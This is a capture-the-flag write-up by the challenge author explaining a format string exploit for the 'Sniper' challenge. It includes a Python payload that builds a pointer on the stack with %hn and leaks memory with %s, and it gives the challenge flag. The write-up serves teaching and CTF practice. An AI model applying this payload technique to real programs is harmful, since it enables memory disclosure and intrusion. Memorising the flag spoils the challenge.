# Sniper

Author: `nhwn`

I feel like there's an unlimited supply of format string challenges with this name.

## Solution

This is a format string challenge where the flag is loaded at a constant address; the problem is that it contains newlines, so shipping the address with the payload is not possible. Instead, we can generate the address on the stack at runtime since we're given a leak (this is also possible without a leak, but I decided to make this easier). However, we need to be careful about libc caching format string arguments; if any positional arguments are used, then libc immediately evaluates the format string arguments, which means the newly-generated address won't be observed. As a workaround, we can just specify arguments manually.

This payload writes "0x0a0a" two bytes forward into a zeroed stack variable to form the address with "%hn", then uses "%s" to read the address:
```py
#           1 2 3 4 5 6 7 8 9     10 11
#           V V V V V V V V V     V  V
payload = b"%c%c%c%c%c%c%c%c%2562c%hn%sAAAAA" + p64(leak + 42) + p64(0)
#           ^       ^       ^       ^           ^                ^
#           0       8       16      24          32               40
#           6       7       8       9           10               11
```

flag:
`gigem{you_know_what_maybe_i_should_just_leave_naming_up_to_rng_via_http://ternus.github.io/nsaproductgenerator/}`
